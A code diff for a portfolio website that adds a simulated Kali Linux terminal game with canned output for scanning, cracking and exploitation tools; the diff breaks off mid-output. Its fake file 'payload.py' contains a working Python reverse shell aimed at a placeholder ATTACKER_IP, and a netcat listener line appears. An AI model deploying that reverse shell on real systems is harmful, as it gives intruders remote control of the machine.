@@ -3839,291 +3839,1419 @@ Just ask naturally — I understand many variations! 🤖`;
 
         let gameProgress = 0;
         const targetIP = '192.168.' + Math.floor(Math.random() * 255) + '.' + Math.floor(Math.random() * 255);
+        const macAddr = 'AA:BB:CC:' + Math.floor(Math.random() * 99).toString().padStart(2, '0') + ':' + Math.floor(Math.random() * 99).toString().padStart(2, '0') + ':' + Math.floor(Math.random() * 99).toString().padStart(2, '0');
+        let currentDir = '/root';
+        let sshConnected = false;
+        let capturedHandshake = false;
+        let sqlTarget = false;
+        let commandHistory = [];
+
+        // Simulated file system
+        const fileSystem = {
+            '/root': ['Desktop', 'Documents', 'Downloads', 'tools', '.bashrc', '.ssh', 'targets.txt', 'payload.py', 'wordlist.txt'],
+            '/root/Desktop': ['notes.txt', 'exploits/'],
+            '/root/Documents': ['report.pdf', 'creds.txt', 'network_map.png'],
+            '/root/Downloads': ['rockyou.txt', 'linpeas.sh', 'pspy64'],
+            '/root/tools': ['scanner.py', 'brute.sh', 'enum.py', 'c2_server.py'],
+            '/root/.ssh': ['id_rsa', 'id_rsa.pub', 'known_hosts', 'authorized_keys'],
+            '/etc': ['passwd', 'shadow', 'hosts', 'resolv.conf', 'ssh/', 'nginx/'],
+            '/var/log': ['auth.log', 'syslog', 'apache2/', 'kern.log'],
+            '/tmp': ['.hidden_backdoor', 'session_data', 'exploit.elf'],
+        };
+
+        // Simulated file contents
+        const fileContents = {
+            'targets.txt': `# Target List — Grok Galaxy Op\n${targetIP}  — Web Server (Apache 2.4)\n10.10.14.22  — Database Server (MySQL)\n10.10.14.55  — Domain Controller (AD)\n172.16.0.1   — Gateway Router`,
+            'payload.py': `#!/usr/bin/env python3\n# Reverse Shell Payload\nimport socket,subprocess,os\ns=socket.socket(socket.AF_INET,socket.SOCK_STREAM)\ns.connect(("ATTACKER_IP",4444))\nos.dup2(s.fileno(),0)\nos.dup2(s.fileno(),1)\nos.dup2(s.fileno(),2)\nsubprocess.call(["/bin/bash","-i"])`,
+            '.bashrc': `# ~/.bashrc\nexport PS1='\\[\\e[31m\\]root@kali\\[\\e[0m\\]:\\[\\e[34m\\]\\w\\[\\e[0m\\]# '\nalias ll='ls -la'\nalias nse='ls /usr/share/nmap/scripts/'\nalias serve='python3 -m http.server 8080'\nexport PATH=$PATH:/opt/tools`,
+            'creds.txt': `[CAPTURED CREDENTIALS]\nadmin:P@ssw0rd123!\nroot:toor\nuser:Welcome1\ndb_admin:MySQL_S3cure!\nbackup:Backup2025!`,
+            'notes.txt': `[PENTEST NOTES]\n- Target scoped: ${targetIP}\n- Initial foothold via weak SSH creds\n- Priv esc: SUID binary /usr/bin/find\n- Lateral movement: Pass-the-Hash\n- Flag location: /root/flag.txt`,
+            '/etc/passwd': `root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\nshankar:x:1000:1000:Shankar Adhikary:/home/shankar:/bin/bash\nmysql:x:27:27:MySQL Server:/var/lib/mysql:/bin/false`,
+            '/etc/shadow': `[ACCESS DENIED] Permission denied. Try 'sudo cat /etc/shadow'`,
+            '/etc/hosts': `127.0.0.1\tlocalhost\n${targetIP}\ttarget.grokgalaxy.local\n10.10.14.22\tdb.grokgalaxy.local\n10.10.14.55\tdc.grokgalaxy.local`,
+            'wordlist.txt': `password\n123456\nadmin\nletmein\nwelcome\nmonkey\nmaster\ndragon\nqwerty\nP@ssw0rd\n... (14,344,391 more lines)`,
+        };
 
         const hackingCommands = {
-            help: `Available commands:
-  help     - Show this help message
-  scan     - Scan for vulnerable targets
-  hack     - Attempt to breach the system
-  decrypt  - Decrypt intercepted data
-  whoami   - Display current user info
-  skills   - Show Shankar's skills
-  contact  - Display contact information
-  clear    - Clear terminal
-  exit     - Exit the simulation`,
+            help: `<span class="text-green-400">╔══════════════════════════════════════════════════╗
+║          KALI LINUX TERMINAL — COMMAND LIST       ║
+╚══════════════════════════════════════════════════╝</span>
+
+<span class="text-yellow-400">── MISSION COMMANDS ──</span>
+  scan       Scan target network (nmap simulation)
+  hack       Exploit target system
+  decrypt    Decrypt captured data
+  
+<span class="text-yellow-400">── INFORMATION GATHERING ──</span>
+  nmap       Network mapper / port scanner
+  whois      Domain/IP WHOIS lookup
+  dig        DNS lookup utility
+  ping       Send ICMP echo requests
+  traceroute Trace packet route to target
+  netdiscover ARP reconnaissance
+  theharvester Email & subdomain harvester
+  recon-ng   Reconnaissance framework
+  dmitry     Deepmagic Information Tool
+  
+<span class="text-yellow-400">── VULNERABILITY ANALYSIS ──</span>
+  nikto      Web server vulnerability scanner
+  wpscan     WordPress scanner
+  sqlmap     SQL injection automation
+  searchsploit Search for exploits (Exploit-DB)
+  gobuster   Directory/file brute-forcer
+  dirb       Web content scanner
+  enum4linux SMB enumeration tool
+  
+<span class="text-yellow-400">── EXPLOITATION ──</span>
+  msfconsole Metasploit Framework console
+  msfvenom   Payload generator
+  hydra      Login brute-force tool
+  john       John the Ripper (password cracker)
+  hashcat    Advanced password recovery
+  burpsuite  Web app security testing
+  setoolkit  Social Engineering Toolkit
+  beef       Browser Exploitation Framework
+  
+<span class="text-yellow-400">── WIRELESS ATTACKS ──</span>
+  airmon-ng  Enable monitor mode
+  airodump-ng Capture wireless packets
+  aircrack-ng Crack WPA/WPA2 keys
+  wifite     Automated wireless auditor
+  
+<span class="text-yellow-400">── SNIFFING & SPOOFING ──</span>
+  wireshark  Network protocol analyzer
+  tcpdump    Command-line packet analyzer
+  ettercap   Man-in-the-middle attacks
+  arpspoof   ARP spoofing tool
+  responder  LLMNR/NBT-NS/MDNS poisoner
+  
+<span class="text-yellow-400">── POST-EXPLOITATION ──</span>
+  netcat     Network Swiss Army Knife (nc)
+  linpeas    Linux privilege escalation
+  winpeas    Windows privilege escalation
+  mimikatz   Credential extraction (Windows)
+  bloodhound AD attack path mapping
+  
+<span class="text-yellow-400">── SYSTEM COMMANDS ──</span>
+  ls         List directory contents
+  cd         Change directory
+  cat        Display file contents
+  pwd        Print working directory
+  id         Display user/group info
+  uname      System information
+  ifconfig   Network interface config
+  ps         Running processes
+  history    Command history
+  neofetch   System info display
+  date       Show date/time
+  uptime     System uptime
+  df         Disk usage
+  
+<span class="text-yellow-400">── PORTFOLIO ──</span>
+  whoami     Display current user info
+  skills     Show Shankar's skills
+  contact    Display contact info
+  certs      Show certifications
+  projects   Show projects
+  about      About Shankar
+  socials    Social media links
+  
+<span class="text-yellow-400">── UTILITIES ──</span>
+  clear      Clear terminal
+  reset      Reset simulation
+  banner     Show ASCII banner
+  matrix     Matrix rain effect
+  exit       Exit terminal`,
+
+            // ═══════════════ INFORMATION GATHERING ═══════════════
+            nmap: () => {
+                gameProgress = Math.max(gameProgress, 1);
+                return `<span class="text-cyan-400">Starting Nmap 7.94SVN ( https://nmap.org )</span>
+Nmap scan report for ${targetIP}
+Host is up (0.023s latency).
+Not shown: 993 closed tcp ports
+
+PORT      STATE  SERVICE       VERSION
+<span class="text-green-400">22/tcp    open   ssh           OpenSSH 8.9p1 Ubuntu</span>
+<span class="text-green-400">53/tcp    open   domain        ISC BIND 9.18.12</span>
+<span class="text-green-400">80/tcp    open   http          Apache httpd 2.4.52</span>
+<span class="text-yellow-400">139/tcp   open   netbios-ssn   Samba smbd 4.15</span>
+<span class="text-yellow-400">443/tcp   open   ssl/https     Apache httpd 2.4.52</span>
+<span class="text-yellow-400">445/tcp   open   microsoft-ds  Samba smbd 4.15</span>
+<span class="text-red-400">3306/tcp  open   mysql         MySQL 8.0.32</span>
+<span class="text-red-400">8080/tcp  open   http-proxy    Squid 5.2</span>
+
+MAC Address: ${macAddr} (VMware)
+OS: Ubuntu 22.04 LTS (Linux 5.15)
+Aggressive OS guesses: Linux 5.x (97%)
+
+<span class="text-green-400">Nmap done: 1 IP address (1 host up) scanned in 24.53 seconds</span>
+[*] Multiple attack vectors found. Try 'nikto', 'gobuster', or 'sqlmap'.`;
+            },
+
             scan: () => {
-                gameProgress = 1;
+                gameProgress = Math.max(gameProgress, 1);
                 return `[SCANNING] Network scan initiated...
 [+] Found target: ${targetIP}
 [+] Port 22 (SSH) - OPEN
 [+] Port 80 (HTTP) - OPEN  
 [+] Port 443 (HTTPS) - OPEN
+[+] Port 3306 (MySQL) - OPEN
 [!] Vulnerability detected: Weak authentication
-[*] Ready to hack. Type 'hack' to proceed.`;
+[*] Ready to hack. Type 'hack' to proceed or use 'nmap' for detailed scan.`;
             },
-            hack: () => {
-                if (gameProgress < 1) return '[ERROR] No target found. Run "scan" first.';
-                gameProgress = 2;
-                return `[HACKING] Initiating breach on ${targetIP}...
-[+] Exploiting weak authentication...
-[+] Bypassing firewall... 
-[+] Injecting payload...
-[✓] ACCESS GRANTED!
-[*] Encrypted data found. Type 'decrypt' to decode.`;
+
+            whois: () => {
+                return `<span class="text-cyan-400">[WHOIS] Querying ${targetIP}...</span>
+
+NetRange:       192.168.0.0 - 192.168.255.255
+CIDR:           192.168.0.0/16
+NetName:        PRIVATE-ADDRESS-CBLK
+Organization:   Grok Galaxy Corp (GROK-13)
+RegDate:        2024-01-15
+Updated:        2025-12-01
+Country:        IN
+City:           Gandhinagar, Gujarat
+
+AdminHandle:    SA2006-ARIN
+AdminName:      Shankar Adhikary
+AdminEmail:     adhikaryshankar04@gmail.com
+
+<span class="text-yellow-400">[*] Target appears to be on a private network.</span>`;
             },
-            decrypt: () => {
-                if (gameProgress < 2) return '[ERROR] No data to decrypt. Complete the hack first.';
-                gameProgress = 3;
-                return `[DECRYPTING] Running decryption algorithm...
-[+] Breaking cipher...
-[+] Reconstructing data...
-[✓] DECRYPTION COMPLETE!
 
-╔════════════════════════════════════════╗
-║  CLASSIFIED INFORMATION RETRIEVED:     ║
-║                                        ║
-║  Name: Shankar Adhikary                ║
-║  Clearance: TOP SECRET                 ║
-║  Status: Cybersecurity Expert          ║
-║  Mission: Secure the Digital Frontier  ║
-║                                        ║
-║  🇮🇳 राष्ट्रीय सुरक्षा सर्वोपरि 🇮🇳      ║
-╚════════════════════════════════════════╝
+            dig: () => {
+                return `<span class="text-cyan-400">; <<>> DiG 9.18.12 <<>> target.grokgalaxy.local</span>
+;; ANSWER SECTION:
+target.grokgalaxy.local.  300  IN  A     ${targetIP}
+target.grokgalaxy.local.  300  IN  MX    10 mail.grokgalaxy.local.
+target.grokgalaxy.local.  300  IN  NS    ns1.grokgalaxy.local.
+target.grokgalaxy.local.  300  IN  TXT   "v=spf1 include:grokgalaxy.local ~all"
 
-[*] Congratulations! You completed the simulation! 🎉`;
+;; ADDITIONAL SECTION:
+db.grokgalaxy.local.      300  IN  A     10.10.14.22
+dc.grokgalaxy.local.      300  IN  A     10.10.14.55
+
+;; Query time: 12 msec
+;; SERVER: ${targetIP}#53
+;; MSG SIZE  rcvd: 245`;
             },
-            whoami: `root@grok-galaxy
-User: Guest Hacker
-Level: Script Kiddie → Elite (Complete the simulation!)
-Mission: Hack into Shankar's portfolio`,
-            skills: `[SHANKAR'S SKILL MATRIX]
-╔══════════════════════════════════════╗
-║ 🛡️ Cybersecurity       ████████░░ 90%║
-║ 💻 Full Stack Dev      ████████░░ 85%║
-║ 🤖 AI/ML               ███████░░░ 75%║
-║ 📸 Photography         ██████░░░░ 70%║
-║ 🎬 Videography         ██████░░░░ 65%║
-╚══════════════════════════════════════╝`,
-            contact: `[CONTACT INFORMATION]
-📧 Email: adhikaryshankar04@gmail.com
-💼 LinkedIn: linkedin.com/in/adhikaryxshankar
-🐙 GitHub: github.com/ShankarAdhikary
-🐦 X: x.com/SHANKARAD2006
-📸 Instagram: instagram.com/the0xshankar`,
-            clear: 'CLEAR',
-            exit: 'EXIT'
-        };
 
-        function addTerminalLine(text, delay = 0) {
-            setTimeout(() => {
-                const line = document.createElement('p');
-                line.className = 'terminal-line';
-                line.style.animationDelay = '0s';
-                line.innerHTML = text;
-                terminalOutput.appendChild(line);
-                terminalOutput.scrollTop = terminalOutput.scrollHeight;
-            }, delay);
-        }
+            ping: () => {
+                return `PING ${targetIP} (${targetIP}) 56(84) bytes of data.
+64 bytes from ${targetIP}: icmp_seq=1 ttl=64 time=0.023 ms
+64 bytes from ${targetIP}: icmp_seq=2 ttl=64 time=0.019 ms
+64 bytes from ${targetIP}: icmp_seq=3 ttl=64 time=0.021 ms
+64 bytes from ${targetIP}: icmp_seq=4 ttl=64 time=0.018 ms
 
-        function processCommand(cmd) {
-            const command = cmd.toLowerCase().trim();
+--- ${targetIP} ping statistics ---
+4 packets transmitted, 4 received, <span class="text-green-400">0% packet loss</span>, time 3004ms
+rtt min/avg/max/mdev = 0.018/0.020/0.023/0.002 ms`;
+            },
 
-            if (command === '') return;
-            if (cmd.length > 100) { addTerminalLine('<span class="text-red-400">[SEC]</span> Input too long. Max 100 characters.'); return; }
+            traceroute: () => {
+                return `<span class="text-cyan-400">traceroute to ${targetIP}, 30 hops max, 60 byte packets</span>
+ 1  gateway (10.0.2.1)  0.321 ms  0.289 ms  0.265 ms
+ 2  172.16.0.1          1.234 ms  1.198 ms  1.156 ms
+ 3  10.10.14.1          2.456 ms  2.412 ms  2.389 ms
+ 4  ${targetIP}         3.012 ms  2.998 ms  2.967 ms
 
-            addTerminalLine(`<span class="text-blue-400">$</span> ${escapeHTML(cmd)}`);
+<span class="text-green-400">[*] Target reached in 4 hops.</span>`;
+            },
 
-            if (command === 'clear') {
-                terminalOutput.innerHTML = '';
-                return;
-            }
+            netdiscover: () => {
+                return `<span class="text-cyan-400">Currently scanning: ${targetIP.split('.').slice(0, 3).join('.')}.0/24</span>
 
-            if (command === 'exit') {
-                hackingGame.classList.remove('active');
-                return;
-            }
+ IP              MAC Address       Hostname
+ ──────────────  ────────────────  ─────────────────────
+ ${targetIP.split('.').slice(0, 3).join('.')}.1       AA:BB:CC:00:00:01  gateway.local
+ ${targetIP}     ${macAddr}  target.grokgalaxy.local
+ ${targetIP.split('.').slice(0, 3).join('.')}.22      AA:BB:CC:00:00:22  db.grokgalaxy.local
+ ${targetIP.split('.').slice(0, 3).join('.')}.55      AA:BB:CC:00:00:55  dc.grokgalaxy.local
+ ${targetIP.split('.').slice(0, 3).join('.')}.100     AA:BB:CC:00:01:00  workstation-01
 
-            const response = hackingCommands[command];
-            if (response) {
-                const output = typeof response === 'function' ? response() : response;
-                output.split('\n').forEach((line, i) => {
-                    addTerminalLine(line, i * 100);
-                });
-            } else {
-                addTerminalLine(`<span class="text-red-400">[ERROR]</span> Command not found: ${cmd}. Type 'help' for available commands.`);
-            }
-        }
+<span class="text-green-400">[*] 5 hosts discovered on the network.</span>`;
+            },
 
-        openGame.addEventListener('click', () => {
-            hackingGame.classList.add('active');
-            terminalInput.focus();
-        });
+            theharvester: () => {
+                return `<span class="text-cyan-400">[*] theHarvester — Email & subdomain harvester</span>
+[*] Target domain: grokgalaxy.local
+[*] Searching: Google, Bing, LinkedIn, GitHub...
 
-        closeGame.addEventListener('click', () => {
-            hackingGame.classList.remove('active');
-        });
+<span class="text-green-400">[+] Emails found:</span>
+  adhikaryshankar04@gmail.com
+  admin@grokgalaxy.local
+  info@grokgalaxy.local
 
-        terminalInput.addEventListener('keypress', (e) => {
-            if (e.key === 'Enter') {
-                processCommand(terminalInput.value);
-                terminalInput.value = '';
-            }
-        });
+<span class="text-green-400">[+] Subdomains found:</span>
+  mail.grokgalaxy.local
+  vpn.grokgalaxy.local
+  dev.grokgalaxy.local
+  api.grokgalaxy.local
+  staging.grokgalaxy.local
 
-        // Close game on Escape key
-        document.addEventListener('keydown', (e) => {
-            if (e.key === 'Escape' && hackingGame.classList.contains('active')) {
-                hackingGame.classList.remove('active');
-            }
-        });
+<span class="text-green-400">[+] LinkedIn profiles:</span>
+  Shankar Adhikary — Cybersecurity @ RRU
 
-        // ==================== COSMIC GALAXY PRELOADER ====================
-        (function () {
-            const preloader = document.getElementById('preloader');
-            const canvas = document.getElementById('preloader-stars');
-            const ctx = canvas.getContext('2d');
+[*] Harvesting complete. 3 emails, 5 subdomains found.`;
+            },
 
-            // Star field
-            function resizeCanvas() {
-                canvas.width = window.innerWidth;
-                canvas.height = window.innerHeight;
-            }
-            resizeCanvas();
-            window.addEventListener('resize', resizeCanvas);
+            'recon-ng': () => {
+                return `<span class="text-cyan-400">[recon-ng][default] ></span> Recon-NG Framework v5.1.2
+[*] Loaded 85 modules
+[*] Available reconnaissance modules:
+  recon/domains-hosts/hackertarget
+  recon/domains-contacts/whois_pocs
+  recon/hosts-ports/shodan_ip
+  recon/netblocks-hosts/reverse_resolve
+  discovery/info_disclosure/cache_snoop
 
-            const stars = [];
-            for (let i = 0; i < 200; i++) {
-                stars.push({
-                    x: Math.random() * canvas.width,
-                    y: Math.random() * canvas.height,
-                    r: Math.random() * 1.5 + 0.3,
-                    a: Math.random(),
-                    da: (Math.random() - 0.5) * 0.02,
-                    dx: (Math.random() - 0.5) * 0.15,
-                    dy: (Math.random() - 0.5) * 0.15
-                });
-            }
+<span class="text-yellow-400">[*] Use 'nmap' or 'theharvester' for quick recon in this simulation.</span>`;
+            },
 
-            let animId;
-            function drawStars() {
-                ctx.clearRect(0, 0, canvas.width, canvas.height);
-                stars.forEach(s => {
-                    s.x += s.dx;
-                    s.y += s.dy;
-                    s.a += s.da;
-                    if (s.a > 1 || s.a < 0.1) s.da *= -1;
-                    if (s.x < 0) s.x = canvas.width;
-                    if (s.x > canvas.width) s.x = 0;
-                    if (s.y < 0) s.y = canvas.height;
-                    if (s.y > canvas.height) s.y = 0;
-                    ctx.beginPath();
-                    ctx.arc(s.x, s.y, s.r, 0, Math.PI * 2);
-                    ctx.fillStyle = `rgba(255,255,255,${s.a})`;
-                    ctx.fill();
-                });
-                animId = requestAnimationFrame(drawStars);
-            }
-            drawStars();
+            dmitry: () => {
+                return `<span class="text-cyan-400">Deepmagic Information Gathering Tool v1.3a</span>
+Target: ${targetIP}
 
-            // Hide preloader
-            window.addEventListener('load', () => {
-                setTimeout(() => {
-                    preloader.classList.add('hidden');
-                    setTimeout(() => {
-                        preloader.style.display = 'none';
-                        cancelAnimationFrame(animId);
-                    }, 800);
-                }, 4800);
+[*] Performing TCP port scan...
+[*] Checking for subdomains...
+[*] Gathering email addresses...
+
+HostIP: ${targetIP}
+HostName: target.grokgalaxy.local
+Registrar: Grok Galaxy Corp
+Uptime: 142 days
+
+<span class="text-green-400">[*] All results saved to /root/dmitry_output.txt</span>`;
+            },
+
+            // ═══════════════ VULNERABILITY ANALYSIS ═══════════════
+            nikto: () => {
+                return `<span class="text-cyan-400">- Nikto v2.5.0</span>
+---------------------------------------------------------------------------
++ Target IP:          ${targetIP}
++ Target Hostname:    target.grokgalaxy.local
++ Target Port:        80
++ Start Time:         ${new Date().toISOString()}
+---------------------------------------------------------------------------
++ Server: Apache/2.4.52 (Ubuntu)
+<span class="text-red-400">+ /admin/: Directory indexing found</span>
+<span class="text-red-400">+ /phpMyAdmin/: phpMyAdmin 5.1.1 found</span>
+<span class="text-red-400">+ /backup/: Backup directory accessible</span>
+<span class="text-yellow-400">+ /robots.txt: Contains 5 disallowed entries</span>
+<span class="text-yellow-400">+ Apache/2.4.52 appears to be outdated (current: 2.4.58)</span>
+<span class="text-red-400">+ OSVDB-3092: /.env file found — may contain credentials!</span>
+<span class="text-red-400">+ X-Frame-Options header missing — clickjacking risk</span>
+<span class="text-yellow-400">+ Server leaks inode via ETags</span>
++ 7 vulnerabilities found. Run 'sqlmap' or 'gobuster' for deeper analysis.
+---------------------------------------------------------------------------`;
+            },
+
+            wpscan: () => {
+                return `<span class="text-cyan-400">_______________________________________________
+        __          _______   _____
+        \\ \\        / /  __ \\ / ____|
+         \\ \\  /\\  / /| |__) | (___   ___ __ _ _ __
+          \\ \\/  \\/ / |  ___/ \\___ \\ / __/ _\` | '_ \\
+           \\  /\\  /  | |     ____) | (_| (_| | | | |
+            \\/  \\/   |_|    |_____/ \\___\\__,_|_| |_|
+        WordPress Security Scanner</span>
+
+[+] URL: http://${targetIP}/
+[+] WordPress version: 6.4.1 (outdated)
+<span class="text-red-400">[!] 3 vulnerabilities found for this version</span>
+[+] Theme: flavor flavor flavor flavor flavorgalaxy-theme v1.2
+<span class="text-yellow-400">[!] Outdated theme detected</span>
+[+] Plugins found:
+  <span class="text-red-400">[!] contact-form-7 v5.7 — SQL Injection (CVE-2023-XXXX)</span>
+  <span class="text-yellow-400">[i] akismet v5.3 — No known vulnerabilities</span>
+  <span class="text-red-400">[!] wp-file-manager v6.8 — RCE (CVE-2020-25213)</span>
+
+[+] Users enumerated:
+  [1] admin
+  [2] shankar
+  
+<span class="text-green-400">[*] Try 'hydra' to brute-force login credentials.</span>`;
+            },
+
+            sqlmap: () => {
+                sqlTarget = true;
+                return `<span class="text-cyan-400">[*] sqlmap v1.7.12 — automatic SQL injection tool</span>
+[*] Target URL: http://${targetIP}/login.php?id=1
+[*] Testing connection...
+
+<span class="text-green-400">[*] Parameter 'id' is vulnerable to SQL injection!</span>
+[*] Type: boolean-based blind
+[*] Type: time-based blind  
+[*] Type: UNION query
+
+[*] Fetching database names...
+<span class="text-green-400">[+] Database: grokgalaxy_db</span>
+<span class="text-green-400">[+] Database: information_schema</span>
+<span class="text-green-400">[+] Database: mysql</span>
+
+[*] Fetching tables from grokgalaxy_db...
+  +──────────────+
+  | users        |
+  | credentials  |
+  | sessions     |
+  | admin_panel  |
+  | secrets      |
+  +──────────────+
+
+<span class="text-red-400">[+] Dumped 5 tables. Credentials extracted!</span>
+[*] admin:P@ssw0rd123! | root:toor | shankar:GrokGalaxy2025!`;
+            },
+
+            searchsploit: () => {
+                return `<span class="text-cyan-400">[*] searchsploit — Exploit Database Search</span>
+Searching for: Apache 2.4.52, OpenSSH 8.9, MySQL 8.0, Samba 4.15
+
+ Exploit Title                                    | Path
+ ─────────────────────────────────────────────────+──────────────
+ Apache 2.4.49-50 - Path Traversal & RCE          | exploits/linux/50383.sh
+ OpenSSH 8.x - Username Enumeration               | exploits/linux/45939.py
+ MySQL 8.0 - Privilege Escalation                  | exploits/linux/51026.py
+ Samba 4.x - Remote Code Execution                 | exploits/linux/42084.rb
+ Apache mod_proxy - SSRF (CVE-2021-40438)          | exploits/linux/50569.py
+
+<span class="text-green-400">[*] 5 potential exploits found. Use 'msfconsole' to weaponize.</span>`;
+            },
+
+            gobuster: () => {
+                return `<span class="text-cyan-400">===============================================================
+Gobuster v3.6 — Directory/File Brute-Forcer
+===============================================================</span>
+[*] Url:            http://${targetIP}
+[*] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+[*] Status codes:   200,204,301,302,307,401,403
+
+<span class="text-green-400">/index.html          (Status: 200) [Size: 14521]</span>
+<span class="text-green-400">/admin               (Status: 301) [Size: 312]</span>
+<span class="text-red-400">/backup              (Status: 200) [Size: 48293]</span>
+<span class="text-green-400">/api                 (Status: 200) [Size: 287]</span>
+<span class="text-yellow-400">/login               (Status: 200) [Size: 3421]</span>
+<span class="text-red-400">/phpMyAdmin          (Status: 200) [Size: 12845]</span>
+<span class="text-red-400">/.env                (Status: 200) [Size: 512]</span>
+<span class="text-yellow-400">/uploads             (Status: 301) [Size: 316]</span>
+<span class="text-green-400">/robots.txt          (Status: 200) [Size: 142]</span>
+<span class="text-red-400">/config.bak          (Status: 200) [Size: 2048]</span>
+
+<span class="text-green-400">===============================================================
+[*] Finished — 10 directories found.</span>`;
+            },
+
+            dirb: () => {
+                return `<span class="text-cyan-400">-----------------
+DIRB v2.22
+-----------------</span>
+URL_BASE: http://${targetIP}/
+WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt
+
+---- Scanning URL: http://${targetIP}/ ----
+<span class="text-green-400">+ http://${targetIP}/admin (CODE:301|SIZE:312)</span>
+<span class="text-green-400">+ http://${targetIP}/api (CODE:200|SIZE:287)</span>
+<span class="text-green-400">+ http://${targetIP}/backup (CODE:200|SIZE:48293)</span>
+<span class="text-green-400">+ http://${targetIP}/index.html (CODE:200|SIZE:14521)</span>
+
+<span class="text-green-400">---- Results: 4 directories found ----</span>
+[*] Similar to 'gobuster'. Try both for comprehensive coverage.`;
+            },
+
+            enum4linux: () => {
+                return `<span class="text-cyan-400">enum4linux v0.9.1 — SMB Enumeration Tool</span>
+Target: ${targetIP}
+
+[+] Server ${targetIP} allows sessions using username '', password ''
+[+] OS: Ubuntu 22.04 LTS
+
+<span class="text-green-400">[+] Share Enumeration:</span>
+  //target/public       Mapping: OK Access: READ
+  //target/admin$       Mapping: DENIED
+  //target/backups      Mapping: OK Access: READ/WRITE
+  //target/IPC$         Mapping: OK Access: READ
+
+<span class="text-green-400">[+] Users via RID cycling:</span>
+  S-1-5-21-...-500  Administrator
+  S-1-5-21-...-1000 shankar
+  S-1-5-21-...-1001 admin
+
+<span class="text-yellow-400">[*] Writable share 'backups' found — potential data exfil point!</span>`;
+            },
+
+            // ═══════════════ EXPLOITATION ═══════════════
+            msfconsole: () => {
+                return `<span class="text-cyan-400">
+                                   ____________
+ [%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%| $a]        [/teletubbies]
+ [%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%| $move_on]  [/kill]
+ [%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%| $b]        [/sleep]
+ [████████████████████████████████| msf]       [/coffee]
+
+       =[ metasploit v6.3.44-dev ]
++ -- --=[ 2368 exploits - 1232 auxiliary ]
++ -- --=[ 1389 payloads - 46 encoders ]
++ -- --=[ 11 nops - 9 evasion ]</span>
+
+<span class="text-red-400">msf6 ></span> Available simulation modules:
+  exploit/multi/handler         — Generic payload handler
+  exploit/unix/ftp/vsftpd_234   — vsFTPd 2.3.4 Backdoor
+  exploit/linux/samba/is_known  — Samba pipe exploit
+  auxiliary/scanner/ssh/ssh_login — SSH Brute Force
+
+<span class="text-yellow-400">[*] Use 'hydra' for brute-force or 'hack' to auto-exploit.</span>`;
+            },
+
+            msfvenom: () => {
+                return `<span class="text-cyan-400">[*] msfvenom — Payload Generator</span>
+
+Generated payloads:
+<span class="text-green-400">[+] linux/x64/meterpreter/reverse_tcp</span>
+    LHOST=10.10.14.2 LPORT=4444
+    Format: elf
+    Size: 250 bytes
+    Saved: /root/payload.elf
+
+<span class="text-green-400">[+] windows/x64/meterpreter/reverse_tcp</span>
+    LHOST=10.10.14.2 LPORT=4445
+    Format: exe
+    Size: 7168 bytes
+    Saved: /root/payload.exe
+
+<span class="text-green-400">[+] php/meterpreter/reverse_tcp</span>
+    LHOST=10.10.14.2 LPORT=4446
+    Format: raw
+    Size: 1116 bytes
+    Saved: /root/shell.php
+
+<span class="text-yellow-400">[*] Use 'netcat' or 'nc -lvnp 4444' to catch the reverse shell.</span>`;
+            },
+
+            hydra: () => {
+                return `<span class="text-cyan-400">Hydra v9.5 — Network Logon Cracker</span>
+[DATA] attacking ssh://${targetIP}:22
+[DATA] Wordlist: /usr/share/wordlists/rockyou.txt
+
+[ATTEMPT] target ${targetIP} - login "admin" - pass "password" - 1 of 14344391
+[ATTEMPT] target ${targetIP} - login "admin" - pass "123456" - 2 of 14344391
+[ATTEMPT] target ${targetIP} - login "admin" - pass "admin" - 3 of 14344391
+...
+<span class="text-green-400">[22][ssh] host: ${targetIP}   login: admin   password: P@ssw0rd123!</span>
+<span class="text-green-400">[22][ssh] host: ${targetIP}   login: root    password: toor</span>
+
+<span class="text-green-400">[*] 2 valid passwords found!</span>
+[*] Try 'ssh' to connect with these credentials.`;
+            },
+
+            john: () => {
+                return `<span class="text-cyan-400">John the Ripper 1.9.0-jumbo-1</span>
+Loaded 5 password hashes (sha512crypt)
+
+<span class="text-green-400">P@ssw0rd123!     (admin)</span>
+<span class="text-green-400">toor             (root)</span>
+<span class="text-green-400">Welcome1         (user)</span>
+<span class="text-green-400">MySQL_S3cure!    (db_admin)</span>
+
+4g 0:00:03:42 DONE (${new Date().toLocaleTimeString()})
+Session completed. 4/5 hashes cracked.
+Use --show to display all results.`;
+            },
+
+            hashcat: () => {
+                return `<span class="text-cyan-400">hashcat v6.2.6 — Advanced Password Recovery</span>
+Session: grokgalaxy
+Hash Mode: 1800 (sha512crypt $6$)
+Device #1: NVIDIA RTX 4090 (16384 MB)
+
+Speed.#1: 512.0 kH/s (Optimized)
+
+$6$rounds=5000$salt$hash...:P@ssw0rd123!
+$6$rounds=5000$salt$hash...:toor
+$6$rounds=5000$salt$hash...:Welcome1
+
+<span class="text-green-400">Status: Cracked (3/5)</span>
+Runtime: 2 mins 15 secs
+Candidates: P@ssw0rd123! -> Welcome1`;
+            },
+
+            burpsuite: () => {
+                return `<span class="text-cyan-400">Burp Suite Professional v2024.1</span>
+
+[Proxy]     Intercepting traffic on 127.0.0.1:8080
+[Scanner]   Active scan on http://${targetIP}
+[Intruder]  Ready for payload injection
+[Repeater]  Request queue: 0
+
+<span class="text-red-400">[VULN] SQL Injection in /login.php (parameter: id)</span>
+<span class="text-red-400">[VULN] XSS Reflected in /search.php (parameter: q)</span>
+<span class="text-yellow-400">[INFO] Session cookie without HttpOnly flag</span>
+<span class="text-yellow-400">[INFO] Missing Content-Security-Policy header</span>
+
+<span class="text-green-400">[*] 2 high, 2 medium vulnerabilities found.</span>
+[*] Use 'sqlmap' for automated SQL injection exploitation.`;
+            },
+
+            setoolkit: () => {
+                return `<span class="text-cyan-400">
+ _____ _____ _____
+|   __|   __|_   _|  Social Engineering Toolkit v8.0.3
+|__   |   __| | |    Coded by: TrustedSec
+|_____|_____| |_|    https://trustedsec.com</span>
+
+Select an attack vector:
+  1) Spear-Phishing Attack
+  2) Website Attack Vectors
+  3) Infectious Media Generator
+  4) Create a Payload and Listener
+  5) SMS Spoofing Attack
+  
